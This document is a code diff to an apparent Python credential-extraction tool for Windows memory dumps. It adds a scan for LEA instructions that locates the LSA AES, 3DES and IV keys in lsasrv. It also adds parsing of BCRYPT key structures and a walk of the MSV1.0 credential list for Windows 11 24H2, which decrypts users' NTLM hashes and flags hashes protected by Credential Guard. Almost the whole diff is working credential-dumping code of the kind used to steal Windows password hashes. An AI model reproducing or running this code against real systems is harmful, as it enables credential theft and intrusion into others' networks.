@@ -43,6 +43,7 @@ class Credential:
     ntlm_hash: str = ""
     sha1_hash: str = ""
     password: str = ""
+    protected: bool = False  # True if Credential Guard (VBS) protects the hash
 
 
 @dataclass
@@ -92,13 +93,11 @@ class CredentialExtractor:
 
         We find them by pattern-matching known byte sequences near the key storage.
         """
-        lsasrv = self.dump.find_module("lsasrv.dll")
+        lsasrv = self.dump.find_module("lsasrv")
         if not lsasrv:
             return None
 
-        # Key patterns vary by Windows build
-        # Windows 10 1809+ / Server 2019+ pattern for AES key reference
-        # Pattern: signature bytes near the key initialization
+        # Try all known patterns (most specific first)
         patterns = self._get_key_patterns()
 
         for pattern_info in patterns:
@@ -115,113 +114,184 @@ class CredentialExtractor:
         return None
 
     def _get_key_patterns(self) -> list[dict]:
-        """Get the byte patterns for finding keys based on OS build."""
-        # These patterns are the byte signatures found near the key global variables
-        # in lsasrv.dll. They change between major Windows versions.
+        """Get the byte patterns for finding keys based on OS build.
 
-        if self._build >= 19041:
-            # Windows 10 2004+ / 11 / Server 2022
-            return [
-                {
-                    "pattern": b"\x8b\xc0\x48\x8d\x05",
-                    "iv_offset": -61,
-                    "des_offset": -73,
-                    "aes_offset": -90,
-                    "key_struct_offset": 0x10,
-                },
-            ]
-        elif self._build >= 17763:
-            # Windows 10 1809 / Server 2019
-            return [
-                {
-                    "pattern": b"\x83\x64\x24\x30\x00\x48\x8d\x45",
-                    "iv_offset": 61,
-                    "des_offset": -73,
-                    "aes_offset": -90,
-                    "key_struct_offset": 0x10,
-                },
-            ]
-        else:
-            # Older versions — generic pattern
-            return [
-                {
-                    "pattern": b"\x83\x64\x24\x30\x00\x44\x8b\x4c\x24",
-                    "iv_offset": 62,
-                    "des_offset": -61,
-                    "aes_offset": -78,
-                    "key_struct_offset": 0x10,
-                },
-            ]
+        Strategy: find the pattern, then scan nearby for LEA RDX instructions
+        that reference the key globals via RIP-relative addressing.
+        """
+        # The 'lea_scan' approach works across builds: find pattern in lsasrv,
+        # scan nearby for LEA to .data section globals, identify IV+key handles
+        return [
+            {
+                # Win10 1809+ / Win11: found near key generation in LsaEncryptMemory
+                "pattern": b"\x83\x64\x24\x30\x00\x48\x8d\x45",
+                "method": "lea_scan",
+            },
+            {
+                # Win10 2004+ alternate
+                "pattern": b"\x8b\xc0\x48\x8d\x05",
+                "method": "lea_scan",
+            },
+            {
+                # Older Windows 10
+                "pattern": b"\x83\x64\x24\x30\x00\x44\x8b\x4c\x24",
+                "method": "lea_scan",
+            },
+        ]
 
     def _extract_keys_at(self, addr: int, pattern_info: dict) -> LsaKeys | None:
-        """Try to extract LSA keys given a pattern match address."""
-        keys = LsaKeys()
+        """Try to extract LSA keys given a pattern match address.
 
-        # Read IV (16 bytes)
-        iv_ptr_offset = pattern_info["iv_offset"]
-        iv_ref = self.dump.read_u32(addr + iv_ptr_offset)
-        if iv_ref is None:
+        Scans for LEA RDX/RCX instructions near the pattern that reference
+        global data (RIP-relative). The globals form a group:
+        IV (16 bytes) + hAesKey (8 bytes ptr) + h3DesKey (8 bytes ptr).
+        """
+        # Read a window around the pattern match
+        window_start = addr
+        window = self.dump.read_memory(window_start, 64)
+        if not window:
             return None
 
-        # The reference is RIP-relative: actual_addr = addr + iv_ptr_offset + 4 + iv_ref
-        iv_addr = addr + iv_ptr_offset + 4 + iv_ref
-        iv_data = self.dump.read_memory(iv_addr, 16)
-        if iv_data:
-            keys.iv = iv_data
+        # Find LEA instructions with RIP-relative addressing in the window
+        # Opcodes: 48 8D 15 (lea rdx), 48 8D 0D (lea rcx), 4C 8D 05 (lea r8)
+        lea_targets = []
+        for i in range(len(window) - 7):
+            if window[i] in (0x48, 0x4C) and window[i + 1] == 0x8D:
+                reg = window[i + 2]
+                if reg in (0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D):
+                    disp = struct.unpack_from("<i", window, i + 3)[0]
+                    rip = window_start + i + 7
+                    target = rip + disp
+                    lea_targets.append(target)
 
-        # Read 3DES key handle pointer
-        des_ptr_offset = pattern_info["des_offset"]
-        des_ref = self.dump.read_u32(addr + des_ptr_offset)
-        if des_ref:
-            des_handle_addr = addr + des_ptr_offset + 4 + des_ref
-            des_key = self._read_bcrypt_key(des_handle_addr, key_size=24)
-            if des_key:
-                keys.des_key = des_key
-
-        # Read AES key handle pointer
-        aes_ptr_offset = pattern_info["aes_offset"]
-        aes_ref = self.dump.read_u32(addr + aes_ptr_offset)
-        if aes_ref:
-            aes_handle_addr = addr + aes_ptr_offset + 4 + aes_ref
-            aes_key = self._read_bcrypt_key(aes_handle_addr, key_size=16)
-            if aes_key:
-                keys.aes_key = aes_key
-
-        return keys
-
-    def _read_bcrypt_key(self, handle_addr: int, key_size: int) -> bytes | None:
-        """Read the actual key bytes from a BCRYPT_KEY_HANDLE structure."""
-        # BCRYPT_KEY_HANDLE → pointer to BCRYPT_KEY structure
-        key_struct_ptr = self.dump.read_ptr(handle_addr)
-        if not key_struct_ptr:
+        if not lea_targets:
             return None
 
-        # The key data is at offset within the BCRYPT_KEY structure
-        # This offset varies, but we can search for the KSSM/MSSK tag
-        key_struct = self.dump.read_memory(key_struct_ptr, 256)
-        if not key_struct:
-            return None
-
-        # Look for "KSSM" (MSSK reversed) or "RUUU" tag that precedes key data
-        tag_offset = key_struct.find(b"KSSM")
-        if tag_offset == -1:
-            tag_offset = key_struct.find(b"MSSK")
-        if tag_offset == -1:
-            # Try another common pattern
-            tag_offset = key_struct.find(b"\x00" * 4 + struct.pack("<I", key_size))
-            if tag_offset != -1:
-                tag_offset += 8
-            else:
-                return None
-        else:
-            # Key data starts after: tag(4) + type(4) + ... typically at +12 from tag
-            tag_offset += 12
-
-        key_data = key_struct[tag_offset : tag_offset + key_size]
-        if len(key_data) == key_size and key_data != b"\x00" * key_size:
-            return key_data
+        # Among LEA targets, find one that looks like a key handle pointer
+        # (points to heap memory containing RUUU/KSSM structures)
+        for target in lea_targets:
+            keys = self._try_key_globals_at(target)
+            if keys:
+                return keys
 
         return None
+
+    def _try_key_globals_at(self, candidate_addr: int) -> LsaKeys | None:
+        """Check if candidate_addr is one of the key globals (IV, hAesKey, h3DesKey).
+
+        Try the candidate as h3DesKey (last in the group), hAesKey, or as IV itself,
+        and attempt to resolve the full set.
+        """
+        # Strategy: try candidate as h3DesKey (most common LEA target)
+        # If so: hAesKey = candidate - 8, IV = candidate - 24
+        for des_offset in (0, -8, -16):
+            h3des_addr = candidate_addr - des_offset
+            haes_addr = h3des_addr - 8
+            iv_addr = h3des_addr - 24
+
+            # Read IV candidate (16 bytes)
+            iv_data = self.dump.read_memory(iv_addr, 16)
+            if not iv_data or iv_data == b"\x00" * 16:
+                continue
+
+            # Read handle pointers
+            aes_ptr_data = self.dump.read_memory(haes_addr, 8)
+            des_ptr_data = self.dump.read_memory(h3des_addr, 8)
+            if not aes_ptr_data or not des_ptr_data:
+                continue
+
+            aes_handle = struct.unpack_from("<Q", aes_ptr_data)[0]
+            des_handle = struct.unpack_from("<Q", des_ptr_data)[0]
+
+            # Validate: handles should be heap pointers (non-zero, reasonable range)
+            if not (0x1000 < aes_handle < 0x800000000000):
+                continue
+            if not (0x1000 < des_handle < 0x800000000000):
+                continue
+
+            # Try to read keys from the handles
+            aes_key = self._read_bcrypt_key(aes_handle)
+            des_key = self._read_bcrypt_key(des_handle)
+
+            if aes_key or des_key:
+                keys = LsaKeys(iv=iv_data)
+                if aes_key:
+                    # Determine which is AES and which is 3DES by key length
+                    if len(aes_key) == 24:
+                        keys.des_key = aes_key
+                    else:
+                        keys.aes_key = aes_key
+                if des_key:
+                    if len(des_key) == 24:
+                        keys.des_key = des_key
+                    else:
+                        keys.aes_key = des_key
+                if keys.aes_key or keys.des_key:
+                    return keys
+
+        return None
+
+    def _read_bcrypt_key(self, handle_ptr: int) -> bytes | None:
+        """Read the actual key bytes from a BCRYPT_KEY_HANDLE/RUUU structure.
+
+        Structure (Win10/11):
+        +0x00: size (DWORD)
+        +0x04: "RUUU" tag
+        +0x08: ptr1
+        +0x10: ptr2
+        +0x18: padding
+        +0x20: kssm_struct_size (DWORD)
+        +0x24: "KSSM" tag
+        +0x28: type/subtype
+        +0x2C: mode
+        +0x30: block_size
+        ...
+        +0x58: cbSecret (DWORD) = actual key length
+        +0x5C: key_data (cbSecret bytes)
+        """
+        # Read enough to cover the full structure
+        raw = self.dump.read_memory(handle_ptr, 256)
+        if not raw:
+            return None
+
+        # Find KSSM tag
+        kssm_off = raw.find(b"KSSM")
+        if kssm_off == -1:
+            kssm_off = raw.find(b"MSSK")
+        if kssm_off == -1:
+            return None
+
+        # cbSecret is at KSSM + 52 (offset 48 from after the tag)
+        cb_offset = kssm_off + 52
+        if cb_offset + 4 > len(raw):
+            return None
+
+        cb_secret = struct.unpack_from("<I", raw, cb_offset)[0]
+        if cb_secret not in (16, 24, 32):
+            # Try alternate offset (some builds have it at KSSM+60)
+            for alt_off in (56, 60, 48, 44):
+                alt_cb_off = kssm_off + alt_off
+                if alt_cb_off + 4 <= len(raw):
+                    val = struct.unpack_from("<I", raw, alt_cb_off)[0]
+                    if val in (16, 24, 32):
+                        cb_secret = val
+                        cb_offset = alt_cb_off
+                        break
+            else:
+                return None
+
+        key_offset = cb_offset + 4
+        if key_offset + cb_secret > len(raw):
+            # Need more data
+            raw = self.dump.read_memory(handle_ptr, key_offset + cb_secret + 16)
+            if not raw or key_offset + cb_secret > len(raw):
+                return None
+
+        key_data = raw[key_offset:key_offset + cb_secret]
+        if key_data == b"\x00" * cb_secret:
+            return None
+
+        return key_data
 
     def _lsa_decrypt(self, encrypted: bytes) -> bytes:
         """Decrypt LSA-encrypted data using the recovered keys."""
@@ -251,12 +321,18 @@ class CredentialExtractor:
         """Extract MSV1.0 credentials (NTLMv1/v2 hashes).
 
         Walks the MSV1.0 credential list in msv1_0.dll memory.
+        For newer builds (26000+), uses data-section linked list scanning.
         """
         credentials = []
 
         msv = self.dump.find_module("msv1_0")
         if not msv:
             return credentials
+
+        # For build 26000+ (Win11 24H2), traditional patterns don't work
+        # Use data-section linked list scan
+        if self._build >= 26000:
+            return self._extract_msv_listscan(msv)
 
         # Find the credential list by searching for known patterns in msv1_0.dll
         # The list head pointer is near a specific signature
@@ -275,6 +351,156 @@ class CredentialExtractor:
                 break  # Found the right list
 
         return credentials
+
+    def _extract_msv_listscan(self, msv) -> list[Credential]:
+        """Extract MSV credentials by scanning for linked lists in msv1_0's data section.
+
+        For Windows 11 24H2 (build 26000+) where traditional byte patterns no longer match.
+        """
+        credentials = []
+
+        # Find data/writable segments of msv1_0 (typically in the upper half of the module)
+        data_start = msv.base_address + (msv.size // 2)
+        data_segs = [
+            s for s in self.dump.memory
+            if data_start <= s.start < msv.base_address + msv.size
+        ]
+
+        # Scan for linked list head pointers
+        for seg in data_segs:
+            for offset in range(0, seg.size - 8, 8):
+                val = struct.unpack_from("<Q", seg.data, offset)[0]
+                if not (0x100000000 < val < 0x800000000000):
+                    continue
+
+                list_head_addr = seg.start + offset
+                # Check if this is a valid list (Flink of target has valid Blink back to us)
+                target_data = self.dump.read_memory(val, 16)
+                if not target_data:
+                    continue
+                flink = struct.unpack_from("<Q", target_data, 0)[0]
+                blink = struct.unpack_from("<Q", target_data, 8)[0]
+
+                # Valid list: blink of first entry == list_head, or single-entry list
+                if blink != list_head_addr:
+                    continue
+                if flink == list_head_addr:
+                    continue  # Empty list (points back to self)
+
+                # Walk and try to parse as MSV entries
+                creds = self._walk_msv_list_26k(list_head_addr)
+                if creds:
+                    credentials.extend(creds)
+                    return credentials  # Found it
+
+        return credentials
+
+    def _walk_msv_list_26k(self, list_head: int) -> list[Credential]:
+        """Walk MSV credential list for build 26000+ structure format."""
+        credentials = []
+
+        first_data = self.dump.read_memory(list_head, 8)
+        if not first_data:
+            return credentials
+        first_entry = struct.unpack_from("<Q", first_data)[0]
+
+        current = first_entry
+        visited = set()
+
+        for _ in range(256):
+            if current in visited or current == 0 or current == list_head:
+                break
+            visited.add(current)
+
+            cred = self._parse_msv_entry_26k(current)
+            if cred:
+                credentials.append(cred)
+
+            # Next entry (Flink at offset 0)
+            next_ptr = self.dump.read_ptr(current)
+            if not next_ptr:
+                break
+            current = next_ptr
+
+        return credentials
+
+    def _parse_msv_entry_26k(self, addr: int) -> Credential | None:
+        """Parse MSV entry for build 26000+ (Win11 24H2).
+
+        Structure offsets determined by reverse engineering:
+        +0x28: "NTLM" tag (4 bytes)
+        +0x48: Username UNICODE_STRING
+        +0x58: Domain UNICODE_STRING
+        +0x7C: Credential blob size (DWORD)
+        +0x80: pCredentials pointer
+        Within pCredentials blob:
+          +0x30: isNtOwfPassword flag (DWORD)
+          +0x40: Encrypted NT hash (16 bytes)
+        """
+        entry = self.dump.read_memory(addr, 256)
+        if not entry:
+            return None
+
+        # Check for "NTLM" tag at +0x28 (signature of MSV entry)
+        if entry[0x28:0x2C] != b"NTLM":
+            return None
+
+        # Read username and domain
+        username = self._read_unicode_string(addr + 0x48)
+        domain = self._read_unicode_string(addr + 0x58)
+
+        if not username:
+            return None
+
+        # Read credential blob size and pointer
+        blob_size = struct.unpack_from("<I", entry, 0x7C)[0]
+        if blob_size == 0:
+            return None  # No credentials in this entry
+
+        pcred_ptr = struct.unpack_from("<Q", entry, 0x80)[0]
+        if not (0x1000 < pcred_ptr < 0x800000000000):
+            return None
+
+        # Read credential blob
+        pcred = self.dump.read_memory(pcred_ptr, 128)
+        if not pcred:
+            return None
+
+        # Check credential version at +0x28 and isIso at +0x2A
+        # isIso=1 means Credential Guard (VBS) is protecting the hash
+        cred_version = struct.unpack_from("<H", pcred, 0x28)[0]
+        is_iso = struct.unpack_from("<H", pcred, 0x2A)[0]
+
+        # Check isNtOwfPassword at +0x30
+        is_nt = struct.unpack_from("<I", pcred, 0x30)[0]
+        if not is_nt:
+            return None
+
+        # Read encrypted NT hash at +0x40
+        encrypted_nt = pcred[0x40:0x50]
+        if encrypted_nt == b"\x00" * 16:
+            return None
+
+        # If Credential Guard is active, hash can't be decrypted from usermode
+        if is_iso:
+            return Credential(
+                username=username,
+                domain=domain,
+                auth_type="msv1_0",
+                ntlm_hash=encrypted_nt.hex(),
+                protected=True,
+            )
+
+        # Decrypt
+        nt_hash_raw = self._lsa_decrypt(encrypted_nt)
+        nt_hash = nt_hash_raw.hex() if nt_hash_raw else encrypted_nt.hex()
+
+        return Credential(
+            username=username,
+            domain=domain,
+            auth_type="msv1_0",
+            ntlm_hash=nt_hash,
+        )
 
     def _get_msv_pattern(self) -> bytes | None:
         """Get the pattern to find MSV credential list based on build."""
